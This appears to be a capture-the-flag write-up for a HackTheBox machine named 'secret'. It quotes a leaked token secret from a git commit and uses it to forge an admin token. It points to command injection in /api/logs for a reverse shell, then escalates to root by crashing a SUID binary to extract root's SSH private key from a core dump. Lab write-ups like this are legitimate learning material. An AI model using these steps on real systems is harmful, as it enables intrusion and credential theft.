## Path
### User
1. By analyzing the website source code downloaded from the website, we can access the APIs via `10.10.11.120/api`.
2. Found `TOKEN_SECRET` in the past commit of the source.
```
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```
3. Use `TOKEN_SECRET` to forge an admin token.
4. `/api/logs` endpoint has command injection, use this to get a reverse shell.
```
if (name == 'theadmin'){$
    const getLogs = `git log --oneline ${file}`;$
    exec(getLogs, (err , output) =>{$
```

### Root
1. `/opt/count` is executable by the user and the SUID is set.
2. Since SUID is set, `count` can read directories as root for us.
3. Since `count` is set to be dumpable by `prctl(PR_SET_DUMPABLE)`, we can dump it while it is waiting for the second input to read files.
4. According to the man page of `core`, "if the first character of `/proc/sys/kernel/core_pattern` is a pipe symbol (`|`), then the remainder of the line is interpreted as the command-line for a user-space program (or script) that is to be executed.", and "instead of being written to a file, the core dump is given as standard input to the program." So the core dump is fed to `apport`, we can find the dumped info at `/var/crash/_opt_count.1000.crash`.
```
dasith@secret:/tmp/.ice1187$ cat /proc/sys/kernel/core_pattern
|/usr/share/apport/apport %p %s %c %d %P %E
```
5. Send `SIGABRT` to `count` while reading `/root/.ssh/id_rsa`, then use `apport-unpack` to unpack the dump info, which give use the core dump ELF file. ([ref](https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash))
```
dasith@secret:/tmp/.ice1187$ apport-unpack _opt_count.1000.crash unpack
dasith@secret:/tmp/.ice1187/unpack$ ls
total 436
drwxr-xr-x 2 dasith dasith   4096 Feb 16 08:01 .
drwxr-xr-x 3 dasith dasith   4096 Feb 16 08:01 ..
-rw-r--r-- 1 dasith dasith      5 Feb 16 08:01 Architecture
-rw-r--r-- 1 dasith dasith 380928 Feb 16 08:01 CoreDump
-rw-r--r-- 1 dasith dasith     24 Feb 16 08:01 Date
...
dasith@secret:/tmp/.ice1187/unpack$ file CoreDump
CoreDump: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from '/opt/count', real uid: 1000, effective uid: 0, real gid: 1000, effective gid: 1000, execfn: '/opt/count', platform: 'x86_64'
```
6. `strings` the core dump file, and the private key of root is revealed.
```
ice1187@ice1187-lab:~/repo/htb/secret$ strings crash/CoreDump
CORE
CORE
count
/opt/count
IGISCORE
CORE
ELIFCORE
/opt/count
```
